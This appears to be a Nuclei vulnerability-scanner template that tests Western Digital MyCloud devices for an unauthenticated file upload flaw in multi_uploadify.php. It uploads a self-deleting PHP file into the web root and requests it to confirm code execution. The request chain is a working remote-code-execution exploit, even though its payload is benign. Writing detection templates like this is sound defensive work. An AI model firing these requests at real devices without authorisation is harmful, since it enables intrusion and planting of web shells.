id: western-digital-mycloud-multi-uploadify-writefile
info:
  name: Western Digital MyCloud Multi Uploadify File Upload
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Exploits a file upload vulnerability in Western Digital MyCloud devices allowing arbitrary file upload and execution.
  reference:
    - https://www.exploitee.rs/index.php/Western_Digital_MyCloud#.2Fjquery.2Fuploader.2Fmulti_uploadify.php_.28added_08.2F06.2F2017.29

variables:
  f1: "{{rand_int(40000, 44800)}}"
  rboundary: "{{rand_text_alpha(8)}}"
  randname: "{{rand_text_alpha(6)}}"

flow: http(1) && http(2) && http(3)

http:
  - id: check-status
    method: GET
    path:
      - "{{BaseURL}}/web/jquery/uploader/multi_uploadify.php?status=1"
    headers:
      Accept: "*/*"
    redirects: false
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: header
        words:
          - "status=1"

  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/web/jquery/uploader/multi_uploadify.php?folder=/var/www/"
    headers:
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}"
    body: |
      ------WebKitFormBoundary{{rboundary}}
      Content-Disposition: form-data; name="Filedata[]"; filename="{{randname}}.php"
      Content-Type: image/jpeg

      <?php echo md5({{f1}});unlink(__FILE__);?>
      ------WebKitFormBoundary{{rboundary}}--
    redirects: false
    matchers:
      - type: status
        status:
          - 302

  - id: verify-file
    method: GET
    path:
      - "{{BaseURL}}/{{randname}}.php"
    redirects: false
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{md5(f1)}}"
